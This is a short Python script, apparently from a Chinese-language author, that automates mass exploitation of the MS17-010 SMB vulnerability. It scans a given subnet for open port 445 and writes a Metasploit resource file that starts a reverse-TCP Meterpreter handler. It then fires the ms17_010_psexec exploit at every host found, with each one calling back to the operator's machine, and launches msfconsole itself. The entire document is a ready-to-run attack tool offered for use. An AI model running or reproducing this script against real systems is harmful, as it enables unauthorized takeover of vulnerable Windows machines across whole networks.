# -*- coding: utf-8 -*-
#凌舞     2018.2.25
#批量执行msf脚本（ms17-010）
# 三方模块 python-nmap , optparse



import nmap
import sys
import os
import optparse



def findTargets(subNet):
    '''
    found target
    '''
    nm = nmap.PortScanner() # instantiate nmap.PortScanner object
    nm = nmap.PortScanner()
    nm.scan(subNet,'445')
    targetHosts= []
    for host in nm.all_hosts():
        if nm[host].has_tcp(445):
            state = nm[host]['tcp'][445]['state']
            if state == 'open':
                print ("[+] Found Host: "+ host)
                targetHosts.append(host)
    return targetHosts


def setHandler(configFile,lhost,lport):
    "监视器"
    configFile.write("use exploit/multi/handler \n")
    configFile.write("set payload windows/meterpreter/reverse_tcp \n")
    configFile.write("set lport " + str(lport) + " \n")
    configFile.write("set lhost " + str(lhost) +  "\n")
    configFile.write("exploit -j -z \n")
    configFile.write("setg DisablePayloadHandler 1 \n") #全局变量，申明己经建了一个，此后所有主机不必重复建立

def setExp(configFile,targetHost,lhost,lport):
    '''
    exp
    '''
    configFile.write('use exploit/windows/smb/ms17_010_psexec \n')
    configFile.write("set RHOST "+ str(targetHost)+ "\n")
    configFile.write("set payload windows/meterpreter/reverse_tcp \n ")
    configFile.write("set lport " + str(lport) + " \n")
    configFile.write("set lhost " + str(lhost) +  "\n")
    configFile.write("exploit -j -z \n")


def main():
    configFile = open('meta.rc','w')
    parser = optparse.OptionParser('[-] 用法：-H <RHOST(s)> -l <lport> [-p <lport>]')
    parser.add_option('-H',dest = 'targetHost',type='string',help ='target hosts')
    parser.add_option('-l',dest = 'lhost',type='string',help ='local host')
    parser.add_option('-p',dest = 'lport',type='string',help ='listen port')
    (options,args)= parser.parse_args()
    if (options.targetHost == None) | (options.lhost ==None):
        print(parser.usage)
        exit()

    lhost = options.lhost
    lport = options.lport
    if lport ==None:
        lport= '55555'
    targetHosts = findTargets(options.targetHost)
    setHandler(configFile, lhost, lport)
    for targetHost in targetHosts:
        setExp(configFile, targetHost,lhost,lport)
    configFile.close()
    os.system('msfconsole -r meta.rc')

if __name__ =='__main__':
    main()